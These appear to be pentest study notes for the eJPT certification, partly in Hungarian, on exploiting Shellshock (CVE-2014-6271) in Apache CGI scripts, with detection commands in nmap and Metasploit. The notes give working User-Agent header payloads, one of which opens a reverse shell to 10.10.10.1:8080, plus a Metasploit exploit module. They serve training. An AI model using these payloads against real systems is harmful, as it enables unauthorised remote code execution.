# bash shellshock (CVE-2014-6271)  !!! EJPT-hez nagyon fontos !!! ez es a hasonlo command injection-ok ismerete !
## info
* ket service-t kell exploitalni
  * apache es bash
* it is a family of vulnerabilities
* in linux bash commands are executed after this special char string "() { :; };"
* apache can run .sh scripts and cgi scripts
* these two vulnerabilities let us to execute code remotely (RCE)
## exploitation info
* szuksegunk van egy cgi scriptre
* barmelyik megfelel ami elerheto az apache-on keresztul
* amikor meghivjuk a cgi scriptet, akkor az csinal egy uj process-t a bash-en keresztul
* az exploitalashoz a specialis karakterket kell beleraknunk a http request-be (valamelyik header-be)
  * a leghatekonyabb a User-Agent header-be belerakni
* manualisan es metasploit-al is exploitalhato
## check if vulnerable
nmap -Pn -v -sV 10.10.10.1 --script=http-shellshock --script-args="http-shellshock.uri=/gettime.cgi"  
use auxiliary/scanner/http/apache_mod_cgi_bash_env
## exploitation steps
### manually
burp send request with modified User-Agent header  
User-Agent: () { :; }; echo; echo; /bin/bash -c 'whoami'  
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.10.10.1/8080 0>&1'    //execute reverse shell payload  
### metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec  
set targeturi /gettime.cgi
